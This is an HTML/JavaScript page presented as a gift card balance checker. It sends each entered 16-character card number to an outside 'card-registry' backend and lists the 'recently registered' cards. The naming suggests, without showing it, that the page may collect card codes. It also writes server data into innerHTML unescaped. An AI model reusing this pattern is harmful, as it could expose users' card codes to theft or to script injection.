<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift Card Balance Checker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        h1 {
            color: #333;
            font-size: 28px;
        }
        .nav-button {
            padding: 8px 16px;
            background: #f5576c;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .nav-button:hover {
            background: #e94563;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .page {
            display: none;
        }
        .page.active {
            display: block;
        }
        .input-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 18px;
            font-family: 'Courier New', monospace;
            text-align: center;
            letter-spacing: 2px;
            text-transform: uppercase;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #f5576c;
        }
        .char-count {
            text-align: center;
            color: #999;
            font-size: 12px;
            margin-top: 5px;
        }
        .primary-button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .primary-button:hover:not(:disabled) {
            transform: translateY(-2px);
        }
        .primary-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .result {
            margin-top: 30px;
            padding: 20px;
            background: #f5f5f5;
            border-radius: 10px;
            display: none;
        }
        .result.show {
            display: block;
        }
        .result.success {
            background: #d4edda;
            border: 2px solid #28a745;
        }
        .result.error {
            background: #f8d7da;
            border: 2px solid #dc3545;
        }
        .result h3 {
            margin-bottom: 10px;
            font-size: 18px;
        }
        .result p {
            color: #666;
            font-size: 14px;
            margin: 5px 0;
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #f5576c;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        .loader.show {
            display: block;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .registry-list {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .registry-card {
            padding: 15px;
            background: #f9f9f9;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            transition: box-shadow 0.3s;
        }
        .registry-card:hover {
            box-shadow: 0 4px 12px rgba(245, 87, 108, 0.1);
        }
        .card-number {
            font-family: 'Courier New', monospace;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            letter-spacing: 1px;
        }
        .card-timestamp {
            font-size: 12px;
            color: #999;
        }
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #999;
        }
        .empty-state-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        @media (max-width: 480px) {
            .container {
                padding: 30px;
            }
            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Balance Checker Page -->
        <div id="balancePage" class="page active">
            <div class="header">
                <h1>üí≥ Gift Card Balance</h1>
                <button class="nav-button" onclick="goToRegistry()">View Recent</button>
            </div>
            <p class="subtitle">Enter your 16-digit gift card number to check balance</p>

            <form id="cardForm">
                <div class="input-group">
                    <input
                        type="text"
                        id="cardInput"
                        placeholder="1234 5678 9012 3456"
                        maxlength="19"
                        autocomplete="off"
                    />
                    <div class="char-count" id="charCount">0/16 characters</div>
                </div>

                <button type="submit" class="primary-button" id="submitBtn">Check Balance</button>
            </form>

            <div class="loader" id="loader"></div>
            <div class="result" id="result"></div>
        </div>

        <!-- Recent Registry Page -->
        <div id="registryPage" class="page">
            <div class="header">
                <h1>üìã Recent Cards</h1>
                <button class="nav-button" onclick="goToBalance()">Back</button>
            </div>
            <p class="subtitle">Recently registered gift cards</p>

            <div class="registry-list" id="registryList"></div>
        </div>
    </div>

    <script>
        const API_URL = 'https://card-registry-backend.onrender.com/api';
        const input = document.getElementById('cardInput');
        const charCount = document.getElementById('charCount');
        const form = document.getElementById('cardForm');
        const submitBtn = document.getElementById('submitBtn');
        const loader = document.getElementById('loader');
        const result = document.getElementById('result');
        const balancePage = document.getElementById('balancePage');
        const registryPage = document.getElementById('registryPage');
        const registryList = document.getElementById('registryList');

        // Format input
        input.addEventListener('input', (e) => {
            let value = e.target.value.toUpperCase();
            value = value.replace(/[^A-Z0-9]/g, '');

            // Format with spaces
            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formatted;

            const cleaned = value.replace(/\s/g, '');
            charCount.textContent = `${cleaned.length}/16 characters`;

            submitBtn.disabled = cleaned.length !== 16;
        });

        // Submit form
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const cardNumber = input.value.replace(/\s/g, '');

            if (cardNumber.length !== 16) {
                showResult('Please enter exactly 16 characters', 'error');
                return;
            }

            submitBtn.disabled = true;
            loader.classList.add('show');
            result.classList.remove('show');

            try {
                const response = await fetch(`${API_URL}/cards`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ cardNumber })
                });

                const data = await response.json();

                if (response.ok && data.success) {
                    saveCardToRegistry(cardNumber, data.submittedAt);
                    showResult(
                        `‚úÖ Balance Check Complete!<br>
                        <p><strong>Card: ${data.cardNumber}</strong></p>
                        <p><strong style="color: #28a745; font-size: 18px;">Balance: $${(data.balance || 0).toFixed(2)}</strong></p>
                        <p style="margin-top: 10px; font-size: 12px;">Checked: ${new Date(data.submittedAt).toLocaleString()}</p>`,
                        'success'
                    );
                    input.value = '';
                    charCount.textContent = '0/16 characters';
                } else {
                    showResult(`‚ùå ${data.error || 'Balance check failed'}`, 'error');
                }
            } catch (error) {
                showResult('‚ùå Network error. Server may be waking up (wait 30-60s and try again)', 'error');
            } finally {
                submitBtn.disabled = false;
                loader.classList.remove('show');
            }
        });

        function showResult(message, type) {
            result.innerHTML = message;
            result.className = `result show ${type}`;
        }

        function goToRegistry() {
            balancePage.classList.remove('active');
            registryPage.classList.add('active');
            loadRecentCards();
        }

        function goToBalance() {
            registryPage.classList.remove('active');
            balancePage.classList.add('active');
            result.classList.remove('show');
        }

        function saveCardToRegistry(cardNumber, submittedAt) {
            let cards = JSON.parse(localStorage.getItem('recentCards') || '[]');

            // Add new card to the beginning of the list
            cards.unshift({
                cardNumber: cardNumber,
                submittedAt: submittedAt || new Date().toISOString()
            });

            // Keep only the most recent 10 cards
            cards = cards.slice(0, 10);

            localStorage.setItem('recentCards', JSON.stringify(cards));
        }

        function loadRecentCards() {
            let cards = JSON.parse(localStorage.getItem('recentCards') || '[]');

            if (cards.length === 0) {
                registryList.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-state-icon">üì≠</div>
                        <p>No cards checked yet</p>
                    </div>
                `;
                return;
            }

            registryList.innerHTML = cards.map(card => `
                <div class="registry-card">
                    <div class="card-number">${card.cardNumber.match(/.{1,4}/g).join(' ')}</div>
                    <div class="card-timestamp">${new Date(card.submittedAt).toLocaleString()}</div>
                </div>
            `).join('');
        }
    </script>
</body>
</html>
